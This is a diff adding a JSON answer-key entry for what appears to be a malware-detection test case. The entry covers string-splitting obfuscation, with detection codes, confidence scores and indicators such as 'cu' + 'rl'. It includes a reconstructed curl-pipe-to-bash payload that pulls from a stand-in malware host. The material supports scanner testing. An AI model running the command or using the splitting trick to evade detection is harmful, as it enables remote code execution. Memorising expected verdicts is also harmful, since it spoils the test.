@@ -1,0 +1,35 @@
+{
+  "sample_id": "adv-017-string-split",
+  "test_category": "string_manipulation_obfuscation",
+  "primary_detection": {
+    "code": "STRING-001",
+    "name": "String Splitting Obfuscation",
+    "description": "Malicious commands constructed by splitting strings to evade keyword-based detection",
+    "confidence": 0.92
+  },
+  "underlying_threats": [
+    {
+      "code": "DATA-002",
+      "name": "Remote Code Execution",
+      "description": "Downloads and executes remote payload via curl piped to bash",
+      "confidence": 0.95
+    },
+    {
+      "code": "EXEC-001",
+      "name": "Shell Command Injection",
+      "description": "Uses subprocess.run and os.system with shell=True for command execution",
+      "confidence": 0.90
+    }
+  ],
+  "obfuscation_indicators": [
+    "String concatenation with + operator to build commands",
+    "Keywords split across multiple string literals: 'cu' + 'rl', 'ba' + 'sh'",
+    "URL fragments split to avoid pattern matching",
+    "Multiple variable assignments combining to form malicious command"
+  ],
+  "reconstructed_payload": "curl https://[REDACTED].example.com/malware | bash",
+  "expected_verdict": "确认恶意",
+  "verdict_reasoning": "Clear attempt to evade detection by splitting known-malicious command patterns across multiple string literals",
+  "risk_level": "critical",
+  "tags": ["obfuscation", "string-split", "remote-code-execution", "shell-injection"]
+}
